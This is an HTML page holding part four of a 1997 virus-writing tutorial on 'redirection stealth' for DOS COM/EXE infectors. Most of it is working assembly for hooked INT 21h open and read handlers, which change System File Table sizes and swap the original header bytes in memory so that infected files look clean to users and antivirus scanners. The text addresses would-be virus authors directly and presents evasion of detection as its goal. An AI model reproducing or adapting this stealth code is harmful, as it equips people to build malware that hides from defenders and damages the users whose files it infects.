@@ -1,0 +1,429 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Simple Tutorial to Stealth Virii - Part #4</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+3>Simple Tutorial to Stealth
+Virii<BR>
+Part #4 - Redirection Stealth<BR>
+</FONT><FONT SIZE=+2>by Virtual Daemon [SLAM]</FONT></FONT></B></P></CENTER>
+
+<CENTER><P><FONT COLOR="#004080"><FONT SIZE=+1><A HREF="tumisc31.htm">part
+#1</A>, <A HREF="tumisc38.htm">part #2</A>, <A HREF="tumisc39.htm">part
+#3</A></FONT></FONT></P></CENTER>
+
+<PRE>
+<HR WIDTH="100%"></PRE>
+
+<UL>
+<PRE> <B>.-----------------------.
+ |       Part -I-        |
+ | Introduction &amp; Theory |
+ '-----------------------'</B></PRE>
+
+<PRE>  This is my 4th attempt to try to present you how stealth techniques can be
+used in your viruses. I already covered (I hope) by now some important topics
+of what we call &quot;stealth methods&quot;. Since we already talked about the size
+stealth method and the so-called &quot;full stealth on disk&quot; method, I think it's
+time to check out something a little more advanced then that...
+  Well, I will try to present you in this tutorial the redirection stealth
+method. Also known as &quot;true full stealth&quot; or as &quot;full stealth in memory&quot;, this
+technique is one of the best file related stealth methods ever known.
+  But why is it called &quot;redirection stealth&quot;? Well, it's very simple... To
+redirect something means to change it's direction. In conclusion, we will
+redirect all the reads to infected bytes to uninfected ones.
+  Let me give you a little example... Let's say you have a COM infector that
+will modify the first 3 bytes of the infected program with a JMP instruction
+to the virus body. We have to hide those 3 bytes so our presence won't be
+detected. So when someone is trying to read those bytes, we will intercept
+the call and we'll give him instead of those bytes the original 3 bytes. We
+can do that by overwriting in memory the 3 bytes read by the specified program
+with our 3 original bytes.
+
+  In order to fully understand this method, you must know what SFT is and what
+is the SFT structure. I already presented the SFT structure in the 2nd part
+of this stealth tutorial guides... Anyway, so you won't bother right now to
+search for that tutorial,I will show ya again those 2 nice tables I love...:)
+
+  System File Table (on short SFT) is a DOS data structure used to mantain the
+state of an open file. Here is the SFT from DOS v4+ structure:
+
+     .--------.-----------.--------------------------------------------.
+     | Offset |   Size    |                Description                 |
+     .--------.-----------.--------------------------------------------.
+     |   0h   |   DWord   | Pointer to next system file table.         |
+     |        |           | Offset ffffh indicates last table in chain |
+     .--------.-----------.--------------------------------------------.
+     |   4h   |   Word    | Number of file descriptors in table.       |
+     .--------.-----------.--------------------------------------------.
+     |   6h   | 3Bh bytes | File descriptor table (59 bytes for every  |
+     |        |           | handle).                                   |
+     '--------'-----------'--------------------------------------------'
+The file descriptor table is an array of 3Bh (59) bytes. Here is its content:
+    .--------.--------.---------------------------------------------------.
+    | Offset |  Size  |                    Description                    |
+    .--------.--------.---------------------------------------------------.
+    |   0h   |  Word  | Number of file handles reffering to this file or  |
+    |        |        | zero if file is no longer open. FFFFh if in use   |
+    |        |        | but not reference.                                |
+    .--------.--------.---------------------------------------------------.
+    |   2h   |  Word  | File open mode. Bit 15 set if file has been opened|
+    |        |        | via FCB.                                          |
+    .--------.--------.---------------------------------------------------.
+    |   4h   |  Byte  | File attributes.                                  |
+    .--------.--------.---------------------------------------------------.
+    |   5h   |  Word  | Device info word:                                 |
+    |        |        |  bit 15 set if remote file                        |
+    |        |        |  bit 14 set = don't set file date/time on closing |
+    |        |        |  bit 13 set if named pipe                         |
+    |        |        |  bit 12 set if no inherit                         |
+    |        |        |  bit 11 set if network spooler                    |
+    |        |        |  bit  7 set if device,clear if file (only local)  |
+    |        |        |  bits 6-0 as for AX=4400h                         |
+    .--------.--------.---------------------------------------------------.
+    |   7h   |  DWord |  Pointer to device driver header if char device,  |
+    |        |        | else pointer to DOS Drive Parameter Block or      |
+    |        |        | REDIR data.                                       |
+    .--------.--------.---------------------------------------------------.
+    |   0Bh  |  Word  | Starting cluster of file (local files only).      |
+    .--------.--------.---------------------------------------------------.
+    |   0Dh  |  Word  | File time in packed format.                       |
+    .--------.--------.---------------------------------------------------.
+    |   0Fh  |  Word  | File date in packed format.                       |
+    .--------.--------.---------------------------------------------------.
+    |   11h  |  DWord | File size.                                        |
+    .--------.--------.---------------------------------------------------.
+    |   15h  |  DWord | Curent file position (offset in file).            |
+    .--------'--------'---------.------------.----------------------------.
+    |                           | Local file |                            |
+    .--------.--------.---------'------------'----------------------------.
+    |   19h  |  Word  | Relative cluster within file of last cluster      |
+    |        |        | accessed.                                         |
+    .--------.--------.---------------------------------------------------.
+    |   1Bh  |  DWord | Number of sector containing directory entry.      |
+    .--------.--------.---------------------------------------------------.
+    |   1Fh  |  Byte  | Number of dir entry within sector (byte offset/32)|
+    .--------'--------'-----.--------------------.------------------------.
+    |                       | Network redirector |                        |
+    .--------.--------.-----'--------------------'------------------------.
+    |   19h  |  DWord | Pointer to REDIRIFS record.                       |
+    .--------.--------.---------------------------------------------------.
+    |   1Dh  | 3 BYTEs| ???                                               |
+    .--------'--------'---------------------------------------------------.
+    .--------.--------.---------------------------------------------------.
+    |   20h  |11 BYTEs| Filename in FCB format.                           |
+    .--------.--------.---------------------------------------------------.
+    |   2Bh  |  DWord | SHARE pointer to previous SFT sharing same file.  |
+    .--------.--------.---------------------------------------------------.
+    |   2Fh  |  Word  | SHARE network machine number which opened file.   |
+    .--------.--------.---------------------------------------------------.
+    |   31h  |  Word  | PSP segment of file owner.                        |
+    .--------.--------.---------------------------------------------------.
+    |   33h  |  Word  | Offset within SHARE code seg of sharing record.   |
+    |        |        | 0000h = none                                      |
+    .--------.--------.---------------------------------------------------.
+    |   35h  |  Word  | Absolute cluster number of last cluster accessed. |
+    |        |        | Zero if file has never been read or written.      |
+    .--------.--------.---------------------------------------------------.
+    |   37h  |  DWord | Pointer to IFS driver for file, 0 if native DOS.  |
+    '--------'--------'---------------------------------------------------'
+
+  That is the SFT structure. Anyway, you have to remember that SFTs aren't
+very compatible with Novell Networks or with Windoze 95. But, we all have to
+start somewhere, don't we? ;)
+
+  The theory of redirection stealth is quite simple... And it's very easy to
+implement it since we can use the same procedures for EXE infections as for
+COM infections.
+  The EXE redirection can be done in two ways... One of them would be to save
+somewhere *ONLY* the modified bytes from beginning, like CS, IP, PartPag or
+PageCnt (or you could recalculate them in memory ;) and then to put them in
+memory instead of the infected/modified bytes when a read call to the
+beginning of file is intercepted. The second method is a little easier than
+the first one and it should be used more often if you are dealing with COM/EXE
+viruses. It consist in saving the WHOLE EXE header (1ch bytes) into a buffer
+in your virus and then restore all those 1ch bytes when a read call to the
+beginning of file is intercepted. I will only present here the second method
+because I personally consider it easier then the first one... and my goal is
+to make you understand what's going on around here, right? ;)
+
+  Since our goal is to hide our virus in the host system (so we won't get
+detected by the user or by AV programs), we will use two steps:
+ &macr; hide the virus body from the end of the file
+ &macr; hide the modified bytes from the beginning of file (if EXE the whole header)
+
+  But when are we going to hide those bytes?
+  Well, as you probably already guessed there is only one way to check the
+bytes from a file: by READing them. So, if an AV program wants to see if a
+file is infected with a virus, the AV will open the file and then read from
+it. Since we must replace those &quot;infected&quot; bytes with the original ones (in
+memory) so we won't get detected, we will have to intercept the DOS read
+function (AH=3Fh) before the AV tries to scan the file. This is practicaly
+the second step. The first one would be to hide the virus body from EOF. Well,
+if you read the second tutorial from this set of stealth related tuts, you
+already know how to do it: by intercepting 3Dh (open file) and 6Ch (extended
+open) and by subtracting the size of our virus from the filesize variable
+located at offset 11h in SFT.
+  Well, in conclusion, we will have to intercept the DOS open functions and
+the read function...
+
+Here's how the int 21h handler will look like:
+
+my_int21h:
+   cmp ah,3dh                   ;open file?
+   je open_file
+   cmp ax,6c00h                 ;extended open?
+   je open_file
+   cmp ah,3fh                   ;read from file?
+   je read_file
+   ...                          ;other stuff
+exithandler:
+   db 0eah                      ;jump to old int 21h
+oldint21   dd ?
+
+ <B>.----------------------.
+ |      Part -II-       |
+ | Source code examples |
+ '----------------------'</B></PRE>
+
+<PRE>  I will first present the procedure that will be executed when the open
+functions (3dh and 6c00h) are trapped. It's exactly the same as the one
+presented in my size stealth tut #2.
+  Note: the seconds must be set to 4 when the virus infects the file. This is
+our marking sign...
+
+<B>--- cut here ---
+</B>open_file:
+   pushf                          ;fake an INT 21h call so we can get the
+   call dword ptr cs:[oldint21]   ;handle (CF will be set if error)
+   jc exit                        ;if error, exit
+
+   cmp ax,5                  ;check to see if the handle is a special device
+   jb damn                   ;oups... it's a special device... exit!
+
+   push ax bx di es          ;save general registers on stack
+
+   xchg bx,ax                ;save the handle in BX
+   push bx                   ;save file handle on stack
+   mov ax,1220h              ;DOS function=get job file table entry
+   int 2fh                   ;CF will be set if error
+   jc noway                  ;Error? Exit, please...
+
+   mov bl,es:[di]            ;put the JFT entry on BL
+   cmp bl,0ffh               ;if BL=0ffh, handle is not open
+   je noway                  ;handle not open? Exit please...
+   mov ax,1216h              ;DOS function=get adress of SFT entry
+   int 2fh                   ;CF will be set if error
+   jc noway                  ;Error: BX is greater then FILES= (Config.Sys)
+
+   cmp word ptr es:[di+28h],'OC'       ;check if the file is really a COM
+   jne check_exe                       ;if not COM check for EXE
+   cmp word ptr es:[di+28h+2],'M'
+   jne check_exe
+   jmp found                           ;COM file found
+check_exe:
+   cmp word ptr es:[di+28h],'XE'       ;check if the file is really a EXE
+   jne noway                           ;no EXE and no COM? Pfuu... Exit then
+   cmp word ptr es:[di+28h+2],'E'
+   jne noway
+found:
+   mov ax,es:[di+0dh]        ;get time from SFT
+   and al,1fh                ;test if infected
+   cmp al,2                  ;seconds number must be set to 4 on infected files
+   jne noway                 ;not infected? exit...
+
+   cmp word ptr es:[di],1    ;check if file has already been opened
+   ja noway                  ;too bad! We can't stealth it...
+   sub word ptr es:[di+11h],(heap-begin) ;subtract the size of our virus
+   sbb word ptr es:[di+13h],0            ;subtract the high word too
+noway:
+   pop bx                    ;restore file handle from stack
+   pop es di bx ax           ;restore registers from stack
+damn:
+   clc
+exit:
+   retf 2                    ;return
+<B>--- cut here ---
+
+</B>  So, when the file gets opened, we will execute first this procedure and then
+we'll restore control to the original function. This way, we will hide the
+size of our virus from open calls.
+
+  Here comes the second part... the procedure that will hide the modified bytes
+(JMP to our virus in case of COM infections, or the modified values from the
+EXE header in case of EXE infections) from the beginning of file.
+  The theory behind it it's very simple: intercept the 3fh function, check if
+a read to the beginning of file is made, and if so replace the read bytes with
+our original bytes in memory.
+
+  Note that the code isn't optimized for size... It's expanded on purpose, just
+to be better understood... Anywayz, it's very easy to make it smaller. :)
+
+<B>--- cut here ---
+</B>read_file:
+   cmp bx,5             ;check the file handle to see if its a special device
+   jae continue         ;if bigger or equal to 5, its just a normal file
+   jmp read_exit
+continue:
+   push ax bx cx di si es    ;save registers on stack
+
+   push bx                   ;save file handle on stack
+   mov ax,1220h              ;DOS function=get job file table entry
+   int 2fh                   ;CF will be set if error
+   jnc noerr1
+finish:
+   pop bx
+   jmp no_read               ;Error? Exit, please...
+noerr1:
+   mov bl,es:[di]            ;put the JFT entry on BL
+   cmp bl,0ffh               ;if BL=0ffh, handle is not open
+   je finish
+
+   mov ax,1216h              ;DOS function=get adress of SFT entry
+   int 2fh                   ;CF will be set if error
+   jc finish                 ;Error: BX is greater then FILES= (Config.Sys)
+   pop bx                    ;restore the file handle from stack
+
+   cmp word ptr es:[di+28h],'OC'       ;check if the file is really a COM
+   jne maybe_exe                       ;if not COM check for EXE
+   cmp word ptr es:[di+28h+2],'M'
+   jne maybe_exe
+   jmp vdrulz                          ;COM file found
+maybe_exe:
+   cmp word ptr es:[di+28h],'XE'       ;check if the file is really a EXE
+   je firstfound
+   jmp no_read                         ;no EXE and no COM? Pfuu... Exit then
+firstfound:
+   cmp word ptr es:[di+28h+2],'E'
+   je vdrulz
+   jmp no_read
+vdrulz:
+   mov ax,word ptr es:[di+0dh]    ;check file's time too see if infected
+   and al,1fh                ;if the file's seconds are set to 4
+   cmp al,2                  ;then the file is infected with our virus
+   je infected
+   jmp no_read               ;this file isn't infected with our virus... :(
+infected:
+   cmp word ptr es:[di+17h],0     ;check to see if the file pointer is in the
+                                  ;first 64K of the file
+   je coolio                      ;yeps... its here alright! :)
+   jmp no_read
+coolio:
+   cmp word ptr es:[di+15h],1ch   ;check to see if the file pointer is in the
+                                  ;first 1ch (=28) bytes of the file
+   jb huray                  ;if in the first 1ch, continue
+   jmp no_read
+huray:
+   mov ax,word ptr es:[di+15h]    ;store the file pointer in ax
+   push ax                        ;save it
+
+   mov ah,3fh                     ;fake a 3Fh (read) call
+   pushf                          ;will return in AX the number of bytes
+   call dword ptr cs:[oldint21]   ;actually read
+
+   pop cx          ;restore the file pointer (CX contains the number of bytes
+                   ;between the beginning and the file pointer's position)
+                   ;Note that this value is smaller then 1ch
+   push ax                        ;save the number of bytes actually read
+                                  ;(returned by the fake read call)
+   sub cx,1ch      ;subtract the size of our buffer (original bytes)
+;CX will contain the difference between the size of our buffer (1ch) and the
+;number of the bytes between beginning and the file pointer's location
+   neg cx          ;make it positive bcoz XX-1ch&lt;0 , where XX=number of bytes
+                   ;from beginning to the file pointer
+   cmp ax,cx       ;compare the number of bytes read with our value
+   jae kewl        ;if bigger or equal, then CX holds the number of bytes
+   xchg ax,cx      ;if not put em in CX
+kewl:
+;DS:DX contains the address of the buffer to receive data from the previous
+;3fh call
+   push cx dx ds   ;save the number of bytes and the address of buffer for
+                   ;later use
+
+   mov ax,word ptr es:[di+15h]
+   push ax                   ;save the file pointer (high and low words)
+   mov ax,word ptr es:[di+17h]
+   push ax
+
+   add word ptr es:[di+11h],(heap-begin)    ;make our virus &quot;visible&quot;
+   adc word ptr es:[di+13h],0     ;by adding its size to the size of the file
+   mov ax,word ptr es:[di+11h]    ;get the current size
+   sub ax,1ch                     ;subtract the size of our buffer
+
+   mov word ptr es:[di+15h],ax    ;go to the end of the file-size of buffer
+   mov ax,word ptr es:[di+13h]
+   mov word ptr es:[di+17h],ax
+
+   push cs
+   pop ds                    ;make DS=CS
+   lea dx,header   ;read from our buffer (where the original bytes are stored)
+   mov cx,1ch                ;read 1ch bytes
+   mov ah,3fh                ;fake an read call to read the original bytes
+   pushf                     ;stored in our virus, that will replace the bytes
+   call dword ptr cs:[oldint21]   ;from the beginning of file
+
+   sub word ptr es:[di+11h],(heap-begin)    ;hide the virus body by
+   sbb word ptr es:[di+13h],0     ;subtracting the size of our virus from the
+                                  ;file size
+
+   pop ax                    ;restore the file pointer (low and high words)
+   mov word ptr es:[di+17h],ax
+   pop ax
+   mov word ptr es:[di+15h],ax
+
+   pop ds dx cx         ;restore the number of bytes and the address of buffer
+   push ds
+   pop es                    ;make ES=DS
+
+   mov di,dx                 ;DI=DX=offset of buffer
+   lea si,header             ;SI=offset of header (where the original bytes
+                             ;are stored)
+   push cs
+   pop ds                    ;make DS=CS
+   rep movsb            ;move bytes in memory (CX holds the number of bytes)
+
+   push es
+   pop ds                    ;make DS=ES
+
+   pop ax                    ;restore the number of bytes actually read
+   pop es si di cx bx es     ;restore registers from stack (ES will be
+                             ;overwriten by AX)
+   clc                       ;clear carry flag (set CF to 0)
+   retf 2                    ;return far
+no_read:
+   pop es si di cx bx ax     ;restore general registers from stack
+read_exit:
+   jmp exithandler           ;return to original INT21h handler
+
+header   db 1ch dup (?)
+<B>--- cut here ---
+
+</B>   Note that &quot;heap&quot; marks the end of the virus, &quot;begin&quot; the beginning of the
+virus and &quot;header&quot; is an array of bytes (1ch bytes=size of EXE header).
+
+   Huray!!! You have reached the end of this phile... :) That's the whole
+shit... simple, isn't it? ;) Well, from now on you will be able to hide your
+virus properly from ANY infected file. I wish you good luck!
+
+   That is the end (I think) of my file related stealth methods. Greetings 
+goes out to Mnemonix (he was one of the first coders that &quot;discovered&quot; this
+method), SLAM, FS and to all the other living creatures out there.
+
+   Well, till next time... byez!
+
+---= Virtual Daemon / SLAM 1997 =---</PRE>
+
+<PRE>
+
+</PRE>
+</UL>
+
+<PRE>
+<HR WIDTH="100%">
+</PRE>
+
+</BODY>
+</HTML>
